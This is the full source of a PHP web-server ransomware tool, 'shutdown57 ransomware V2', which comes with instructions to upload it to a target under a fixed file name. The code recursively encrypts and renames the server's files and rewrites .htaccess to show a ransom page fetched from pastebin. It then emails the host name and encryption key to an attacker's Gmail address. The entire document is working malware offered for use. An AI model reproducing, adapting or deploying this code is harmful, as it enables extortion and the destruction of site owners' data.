<?php
/*
* +--------------------------+
* |Ransomware|
* +--------------------------+
*
* SAVE WITH THE NAMEs57rsw.php
* Note :: you must save or upload this file to the target with the file name "s57rsw.php", in order to be safe.
* NOTE :: you must save or upload this file to the target with the file name "s57rsw.php", in order to be safe.
*/
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
 
Class shutdown57_rsw{
    public $msg = "https://pastebin.com/raw/pjABMiPH";
    public $report_to = "CyberTeam404@gmail.com"; 
    public function __construct()
    {?>     <!DOCTYPE html>
        <html>
        <head>
            <title>Ransomware</title>
            <meta charset="utf-8">
            <meta name="author" content="Locked">
            <meta name="description" content="Ransomware">
            <style type="text/css">html,body{background: #000;color: #eee;text-align: center;}input,select{color: #eee;background: #000;padding: 6px;border:1px solid #f00;}a{color:#f00;text-decoration:none}a:hover{text-decoration: underline;color: #eee}</style>
        </head>
        <body><br/><br/><br/><br/><br/><br/>
            <fieldset style="max-width: 800px;margin: 0 auto;box-shadow: 0px 0px 20px #f00"><legend>shutdown57 ransomware V2</legend>
<pre>     _           _      _                     ____ _____
 ___| |__  _   _| |_ __| | _____      ___ __ | ___|___  |
/ __| '_ \| | | | __/ _` |/ _ \ \ /\ / / '_ \|___ \  / /
\__ \ | | | |_| | || (_| | (_) \ V  V /| | | |___) |/ /  
 |___/_| |_|\__,_|\__\__,_|\___/ \_/\_/ |_| |_|____//_/    
+
+---- [ CyberTeam404@gmail.com ] ----+
 
STATUS : <?=(is_writable($this->locate())) ? "<font color=lime>RANSOMABLE</font>" : "<font color=red>UNRANSOMABLE</font> on ";echo " on ".$this->locate()."<br>"; ?>
S57RSW : <?=(file_exists('.hts57rsw')) ? "<font color=lime>THIS SERVER INFECTED S57RSW</font>" : "<font color=red>THIS SERVER STILL SECURE FROM S57RSW</font>";?>
</pre><?php
        if(empty($_POST['opt']) && empty($_POST['key'])){
        ?>
 
        <form method="post">
            <label>Input key ::</label>
            <input type="text" name="key" placeholder="enter key" style="width: 250px" required="">
            <select name="opt">
                <option>- s57rsw -</option>
                <option value="e">encrypt</option>
                <option value="d">decrypt</option>
            </select>
        <input type="submit" value=">>">
        </form>
        <?php
    }else{
        echo "[ <a href='?'>Back </a>] <br>";
        $opt = $_POST['opt'];
        $key = $_POST['key'];
switch ($opt) {
   case 'e':
      $this->s57runrsw($this->locate(),'e',$key);
   break;
   case 'd':
     $this->s57runrsw($this->locate(),'d',$key);
   break;
}
    }
    ?>  </fieldset>
        </body>
        </html><?php
    }
    public function s57init()
    {
        if(!file_exists('.hts57rsw'))
        {if(file_exists('.htaccess')){
            rename('.htaccess','.hts57rsw');
        }else{
            touch('.htaccess');
            rename('.htaccess','.hts57rsw');
        }
            $fp = fopen('.htaccess','w');
            $htc ="# shutdown57 ! [ encrypted at ".date('D , d M Y H:i:s')." ]\r\nDirectoryIndex shutdown57.php\r\nErrorDocument 404 /shutdown57.php";
            fwrite($fp,$htc);
            echo ".... Manipulating <i><b>.htaccess</b></i> DONE .... <br>";
        }
        if(preg_match("/^http/",$this->msg))
        {
            $msg = file_get_contents($this->msg);
        }else{
            $msg = base64_decode($this->msg);
        }
        if(file_put_contents('shutdown57.php',$msg))
        {
            echo ".... Manipulating <i><b>Index & Change display of page</b></i>  DONE .... <br>";
        }
    }
    public function s57unit()
    {
        if(file_exists('.hts57rsw'))
        {
            if(unlink('.htaccess') && unlink('shutdown57.php'))
            {
                echo ".... Restore <i><b>.htaccess</b></i> DONE .... <br>";
                echo ".... Restore <i><b>Index files</b></i> DONE ....<br>";
            }
            rename('.hts57rsw','.htaccess');
        }
    }
    public function s57ended($npy,$method){
      switch ($method) {
        case 'e':
          rename($npy, $npy.".shutdown57");
        break;
        case 'd':
          $npys = str_replace(".shutdown57", "", $npy);
          rename($npy, $npys);
        break;
      }
   }
      public function enkontol($key,$pwd){
      $data = file_get_contents($pwd);
      $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),MCRYPT_DEV_URANDOM);
      $encrypted = base64_encode($iv.mcrypt_encrypt(MCRYPT_RIJNDAEL_128,hash('sha256',$key,true),$data,MCRYPT_MODE_CBC,$iv));
      if(file_put_contents($pwd,$encrypted )){
         echo "[<font color=lime>LOCKED</font>][".date('d:m:Y')."] => ".$pwd." <br>";
      }else{
         echo "[<font color=red>FAILED</font>][".date('d:m:Y')."] => ".$pwd." <br>";
      }
   }
   public function dekontol($key,$pwd){
      $data = base64_decode( file_get_contents($pwd) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
      $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128,hash('sha256', $key, true),substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),MCRYPT_MODE_CBC,$iv),"\0");
      if(file_put_contents($pwd,  $decrypted )){
        echo "[<font color=lime>UNLOCKED</font>][".date('d:m:Y')."] => ".$pwd." <br>";
      }else{
        echo "[<font color=red>--FAILED</font>][".date('d:m:Y')."] => ".$pwd." <br>";
      }
   }
   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
   public function s57runrsw($dir,$method,$key)
   { switch ($method) {
          case 'e':
            $this->s57init();
          break;
          case 'd':
           $this->s57unit();
          break;
        }
        $s = scandir($dir);
        foreach($s as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if($this->kecuali($locate,"s57rsw.php")&&
                    $this->kecuali($locate,".png")  &&
                    $this->kecuali($locate,".htaccess")  &&
                    $this->kecuali($locate,"shutdown57.php") &&
                     $this->kecuali($locate,"index.php") &&
                     $this->kecuali($locate,".hts57rsw") ){
                     switch ($method) {
                        case 'e':
                           $this->enkontol($key,$locate);
                           $this->s57ended($locate,'e');
                        break;
                        case 'd':
                           $this->dekontol($key,$locate);
                           $this->s57ended($locate,'d');
                        break;
                     }
                   }
                }else{
                  $this->s57runrsw($locate,$method,$key);
                }
            }
            $this->plus();
        }
        $this->report($key);
    }
       public function report($key){
        $message.= "=========     Report Ransomware    =========\n";
        $message.= "Server    : ".$_SERVER['HTTP_HOST']."\n";
        $message.= "Key       : ".$key."\n";
        $message.= "Encrypted : ".date('D , d M Y H:i:s')."\n";
        $message.= "========= Indonesian (2018) Ransomware =========\n";
        $subject = "[RANSOMWARE][".$_SERVER['HTTP_HOST']."]";
        $headers = "From: s57rsw <ransomeware@shutdown57.today>\r\n";
        mail($this->report_to,$subject,$message,$headers);
   }
     public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
}
 
new shutdown57_rsw();
 ?>